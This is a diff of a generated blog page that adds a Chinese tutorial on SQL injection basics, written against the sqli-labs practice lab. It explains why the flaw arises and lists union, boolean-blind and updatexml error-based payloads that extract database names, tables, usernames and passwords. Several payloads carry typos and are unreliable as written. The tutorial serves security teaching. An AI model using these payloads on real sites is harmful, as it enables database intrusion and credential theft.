@@ -8,14 +8,21 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>惊鸿</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="web安全之SQL注入基础">
+<meta property="og:type" content="article">
 <meta property="og:title" content="惊鸿">
-<meta property="og:url" content="http://yoursite.com/web安全/WAF.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/07/sql注入的基础/index.html">
 <meta property="og:site_name" content="惊鸿">
+<meta property="og:description" content="web安全之SQL注入基础">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-07-22T02:11:18.089Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007bHQE8gy1g58jreepkjj30sb0awdru.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007bHQE8gy1g58jsq6ujpj30sh0fy0wh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007bHQE8gy1g58ldmekhdj30lr0dsgoe.jpg">
+<meta property="og:updated_time" content="2019-08-07T10:04:42.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="惊鸿">
+<meta name="twitter:description" content="web安全之SQL注入基础">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007bHQE8gy1g58jreepkjj30sb0awdru.jpg">
   
     <link rel="alternative" href="/atom.xml" title="惊鸿" type="application/atom+xml">
   
@@ -169,12 +176,131 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-sql注入的基础" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="web安全之SQL注入基础"><a href="#web安全之SQL注入基础" class="headerlink" title="web安全之SQL注入基础"></a>web安全之SQL注入基础</h3><a id="more"></a>
+
+<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><h2 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h2><h3 id="Web请求响应过程："><a href="#Web请求响应过程：" class="headerlink" title="Web请求响应过程："></a>Web请求响应过程：</h3><p><img src="http://ww1.sinaimg.cn/large/007bHQE8gy1g58jreepkjj30sb0awdru.jpg" alt>                                           </p>
+<h3 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h3><p>就是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p>
+<h3 id="为什么会产生sql注入"><a href="#为什么会产生sql注入" class="headerlink" title="为什么会产生sql注入?"></a>为什么会产生sql注入?</h3><p>开发人员可以使用动态SQL语句创建通用，灵活的应用。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的sql语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段（如select语句）,或者根据不同的条件选择不同的查询表时，动态地构造SQL语句会非常有用。</p>
+<blockquote>
+<blockquote>
+<p>Php语句为列：</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p><code>$query=“SELECT * FROM users WHERE id = $_GET[‘id’]”;</code></p>
+</blockquote>
+</blockquote>
+<p>由于这里的参数ID可控，且带入数据库查询，所以非法用户可以任意拼接SQL语句进行攻击。</p>
+<p>   <img src="http://ww1.sinaimg.cn/large/007bHQE8gy1g58jsq6ujpj30sh0fy0wh.jpg" alt></p>
+<h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><h3 id="Sql注入漏洞的产生需要满足那两个条件？"><a href="#Sql注入漏洞的产生需要满足那两个条件？" class="headerlink" title="Sql注入漏洞的产生需要满足那两个条件？"></a>Sql注入漏洞的产生需要满足那两个条件？</h3><p>​        参数用户可控：前端传给后端的参数内容是用户可以控制的。</p>
+<p>​        参数带入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。</p>
+<p><strong>当传入ID参数为1’时，数据库执行的代码如下所示。</strong>   </p>
+<p><code>sehlect * from users where id =1&#39;</code></p>
+<p><strong>这样是会报出错误的，因为这不符合数据库语法规范。</strong></p>
+<p><strong>当传入的ID参数为and 1=1 时，执行的SQL语句如下所示。</strong></p>
+<p><code>select * from users where id = 1&#39; and 1=1</code></p>
+<p><strong>因为1=1为真，且where语句中id1=1也为真，所以页面会返回与id=1相同的结果。</strong></p>
+<p><strong>当传入的ID参数为and 1=2时，由于1=2不成立，所以返回假，页面就会返回与id=1不同的结果。</strong></p>
+<p><strong>由此可以初步判断ID参数存在SQL注入漏洞，攻击者可以进一步拼接SQL语句进行攻击，致使数据库信息泄露，甚至进一步获取服务器权限等。</strong></p>
+<p>—————————————————————————————————————————————————————</p>
+<p><strong>在实际环境中，凡是满足上述两个条件的参数皆可能存在SQL注入漏洞，因此开发者需秉持“外部参数皆不可信的原则”进行开发。</strong></p>
+<p> —————————————————————————————————————————————————————  </p>
+<h2 id="与MySQL注入相关的知识点"><a href="#与MySQL注入相关的知识点" class="headerlink" title="与MySQL注入相关的知识点"></a>与MySQL注入相关的知识点</h2><h3 id="Mysql数据库"><a href="#Mysql数据库" class="headerlink" title="Mysql数据库"></a>Mysql数据库</h3><p>数据库A=网站A</p>
+<p>​        表名</p>
+<p>​           列名</p>
+<p>​             数据</p>
+<p>数据库 B=网站B</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">数据库</span><br></pre></td></tr></table></figure>
+
+<p>在MySql5.0 版本之后，MySql默认在数据库中存放一个<code>“information_schema”</code>的数据库，在该库中，读者需要记住三个表名，分别是</p>
+<p><code>SCHEMATA,TABLES,COLUMNS</code></p>
+<p><code>SCHEMNSz表存储该用户创建的所有数据库的库名，我们需要记住该表中记录数据库库名的字段名为SCHEMA_NAME</code></p>
+<p><code>TABLES</code>表存储该用户创建的所有数据库的库名和表名，我们需要记住该表中记录数据库库名和表名的字段名分别为<code>TABLE_SCHEMA和TABLE_NAME</code>。</p>
+<p><code>COLUMNS</code>表名和字段名的字段名为<code>TABLE_SCHEMA，TABLE_NAME和COLUMN_NAME</code>。</p>
+<h3 id="Mysql查询语句"><a href="#Mysql查询语句" class="headerlink" title="Mysql查询语句"></a>Mysql查询语句</h3><p>  在不知道任何条件时，语句如下所示。</p>
+<p><code>SELECT 要查询的字段名 FROM 库名.表名</code></p>
+<p>  在知道一条已知条件时，语句如下所示。</p>
+<p><code>SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件的字段名=‘已知条件的值’</code></p>
+<p>  在知道两条已知条件时，语句如下所示。</p>
+<p><code>SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知道条件1的字段名=‘已知条件1的值’ AND 已知条件2的字段名=‘已知条件2的值’</code></p>
+<h3 id="Limit-的用法"><a href="#Limit-的用法" class="headerlink" title="Limit 的用法"></a>Limit 的用法</h3><p>Limit的使用格式为limit m,n, 其中m是指记录开始的位置，从0开始，表示第一条记录;n是指取n条记录。</p>
+<p>例如limit 0,1表示从第一条记录开始，取一条记录，</p>
+<h3 id="需要记住的几个函数"><a href="#需要记住的几个函数" class="headerlink" title="需要记住的几个函数"></a>需要记住的几个函数</h3><p><code>Database():当前网站使用的数据库</code></p>
+<p><code>Version():当前MySQL的版本</code></p>
+<p><code>User():当前MySQL的用户</code></p>
+<h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h3><p>   在MySQL中，常见注释符的表达方式：<code>#或-- 空格或/**/</code></p>
+<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>内联注释的形式：/<em>! code</em>/。内联注释可以用于整个SQL语句中，用来执行我们的SQL语句，下面举一个列： </p>
+<p><code>index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code></p>
+<h2 id="Union（联合）注入攻击"><a href="#Union（联合）注入攻击" class="headerlink" title="Union（联合）注入攻击"></a>Union（联合）注入攻击</h2><p>[在线靶场][<a href="http://43.247.91.228:84/Less-1/?id=1]" target="_blank" rel="noopener">http://43.247.91.228:84/Less-1/?id=1]</a></p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1</a></p>
+<h3 id="一、判断是否用-‘-做字符串引号"><a href="#一、判断是否用-‘-做字符串引号" class="headerlink" title="一、判断是否用(‘)做字符串引号"></a>一、判断是否用(‘)做字符串引号</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;and 1=1 --+</code></p>
+<p><code>https://blog.csdn.net/qq_41630808/article/details/80570197</code></p>
+<p>正常输出</p>
+<p>出错代表没有闭合  说明没有用’可能没有用’ 或用了”或() </p>
+<p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1%27and%201=2--+</code></p>
+<p>则是’’字符串注入</p>
+<h3 id="二、判断它所在的数据库有几列"><a href="#二、判断它所在的数据库有几列" class="headerlink" title="二、判断它所在的数据库有几列"></a>二、判断它所在的数据库有几列</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order by 3 --+ 判断是否有3列</code></p>
+<p>正常</p>
+<p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order by 4 --+ 判断是否有4列</code></p>
+<p>错误</p>
+<p>说明它输出的内容所在的数据库有3列</p>
+<h3 id="三、判断他显示的内容在数据库的第几列"><a href="#三、判断他显示的内容在数据库的第几列" class="headerlink" title="三、判断他显示的内容在数据库的第几列"></a>三、判断他显示的内容在数据库的第几列</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3 --+</code></p>
+<p>则 Your Login name 在第二列Your Password在第三列</p>
+<p>我选择在第二列输出我想要的内容</p>
+<h3 id="四、查找出当前用户权限"><a href="#四、查找出当前用户权限" class="headerlink" title="四、查找出当前用户权限"></a>四、查找出当前用户权限</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,user(),3 --+</code></p>
+<p>root权限</p>
+<h3 id="五、查找当前数据库"><a href="#五、查找当前数据库" class="headerlink" title="五、查找当前数据库"></a>五、查找当前数据库</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),3 --+</code></p>
+<h3 id="当前数据库是-security"><a href="#当前数据库是-security" class="headerlink" title="当前数据库是 security"></a>当前数据库是 security</h3><h3 id="六、查找security的表名"><a href="#六、查找security的表名" class="headerlink" title="六、查找security的表名"></a>六、查找security的表名</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39;),3 --+</code></p>
+<p>表名是 emails,referers,uagents,users</p>
+<blockquote>
+<blockquote>
+<p>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>数参数(就是字段名)决定  </p>
+</blockquote>
+</blockquote>
+<h3 id="七、查找users里的字段"><a href="#七、查找users里的字段" class="headerlink" title="七、查找users里的字段"></a>七、查找users里的字段</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;),3 --+</code></p>
+<h3 id="八、查找用户名"><a href="#八、查找用户名" class="headerlink" title="八、查找用户名"></a>八、查找用户名</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(username) from security.users),3 --+</code> </p>
+<h3 id="九、查找密码"><a href="#九、查找密码" class="headerlink" title="九、查找密码"></a>九、查找密码</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(password) from security.users),3 --+</code></p>
+<p>这样 这个就完成了  已经拿到了账号密码 </p>
+<h2 id="Union-联合-注入代码分析"><a href="#Union-联合-注入代码分析" class="headerlink" title="Union  (联合) 注入代码分析"></a>Union  (联合) 注入代码分析</h2><p><strong>在Union注入页面中，程序获取GET参数ID，将ID拼接到SQL语句中，在数据库中查询参数的ID对应的内容，然后将第一条查询结果中的<code>username</code>和<code>address</code>输出到页面，</strong></p>
+<p><strong>由于是将数据输出到页面上的，所以利用Union语句查询其他数据，代码如下：</strong></p>
+<p> ![</p>
+<p>](<a href="http://ww1.sinaimg.cn/large/007bHQE8gy1g58le58wz5j30ou0bo77h.jpg" target="_blank" rel="noopener">http://ww1.sinaimg.cn/large/007bHQE8gy1g58le58wz5j30ou0bo77h.jpg</a>)</p>
+<p><strong>当访问<code>id=1 union select 1,2,3</code>时，执行的SQL语句为:</strong></p>
+<p>`Select * from users where ‘id’=1 union select 1,2,3``</p>
+<p>  <strong>此时sql语句可以分为<code>select \* from users where ‘id’=1</code>和<code>union select 1,2,3</code>两条，利用第二条语句（Union查询）就可以获取数据库中的数据。</strong></p>
+<p> <strong>（优化在源码中添加sql语句执行代码）</strong></p>
+<h2 id="Boolean-布尔型-注入攻击"><a href="#Boolean-布尔型-注入攻击" class="headerlink" title="Boolean  (布尔型) 注入攻击"></a>Boolean  (布尔型) 注入攻击</h2><p><code>1&#39; and length(database())&gt;=1--+         //判断数据库的长度</code></p>
+<p><code>l&#39; and substr(database(),1,1)=‘t’ --+       //判断数据库第一个字母的值</code></p>
+<p><code>l&#39; and substr(database(),2,1)=‘q’ --+      //判断数据库的第二个字母的值</code></p>
+<p><code>l&#39; and ord(substr(database(),1,1))=115--+  //利用ord和ASCII判断数据库库名</code></p>
+<p><code>l&#39; and substr(database(),2,1)=’q’--+       //利用substr判断数据库的库名</code></p>
+<p><code>l&#39; and substr(select table_name from information_schema.table where table_schema=‘sql’ limit 0,1),1,1)=‘e’ --+   //利用substr判断数据库的表名</code></p>
+<p><strong>1.</strong>    <code>length(str)</code>：返回str字符串的长度。</p>
+<p><strong>2.</strong>    <code>substr(str, pos, len)</code>：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p>
+<p><strong>3.</strong>   <code>mid(str,pos,len):</code>跟上面的一样，截取字符串</p>
+<p><strong>4.</strong>    <code>ascii(str)</code>：返回字符串str的最左面字符的ASCII代码值。</p>
+<p><strong>5.</strong>    <code>ord(str):</code>同上，返回ascii码</p>
+<p><strong>6.</strong>    <code>if(a,b,c) :a</code>为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p>
+<h2 id="Boolean-布尔型-注入代码分析"><a href="#Boolean-布尔型-注入代码分析" class="headerlink" title="Boolean (布尔型)注入代码分析"></a>Boolean (布尔型)注入代码分析</h2><p>在Boolean注入页面中程序先获取GET参数ID,通过preg_match判断其中是否存在union/sleep/benchmark等危险字符。然后将参数ID拼接到SQL语句，从数据库中查询，</p>
+<p><img src="http://ww1.sinaimg.cn/large/007bHQE8gy1g58ldmekhdj30lr0dsgoe.jpg" alt></p>
+<p>当访问id=1‘ or 1=1%23时，数据库执行的语句为selcet * from user where ‘id’=’1’ or 1=1#,由于or 1=1是永真条件，所有此时返回正常。当访问id=1‘ and 1=2%23时，</p>
+<p>数据库执行的语句为select * from users where ‘id’ = ‘1’ and 1=2#, 由于and‘1‘ =’2‘ 是永假条件，所有此时页面肯定会返=返回错误。</p>
+<h2 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h2><p>updatexml(1,concat(0x7e,(select user()),0x7e),1)–+       //利用updatexml获取user()</p>
+<p>‘ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+   //利用updatexml获取database（）</p>
+<p>`‘ and updatexml(1,concat(0x7e,(select select schema_name from information_schema.schemata limit 0,1),0x7e),1)–+**              <strong>//**</strong>利用报错注入获取数据库库名</p>
+<p>‘ and updatexml(1,concat(0x7e,(select select table_name from information_schema.tables where table_schema= ‘test’  limit 0,1),0x7e),1)–+    //利用报错注入获取数据库表名 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## 报错注入攻击代码分析</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**在报错注入页面中，程序获取GET参数username 后，将username拼接到SQL语句中然后，然后到数据库查询。**</span><br><span class="line"></span><br><span class="line"> ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58lsi2dz3j30ua0a9419.jpg)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入username=1‘时，SQL语句为select * from user where ‘username’=‘1“。执行时会因为多了一个单引号而报错。利用这种错误回显，我们可以通过floor(),updatexml()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">等函数将要查询的内容输出到页面上。</span><br></pre></td></tr></table></figure>
       
 
       
@@ -253,7 +379,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/web安全/WAF.html" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/07/sql注入的基础/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -265,6 +391,25 @@
 </article>
 
   
+<nav id="article-nav">
+  
+    <a href="/2019/08/07/sql注入绕过技术/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/08/07/sql语句的基础知识/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -315,7 +460,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
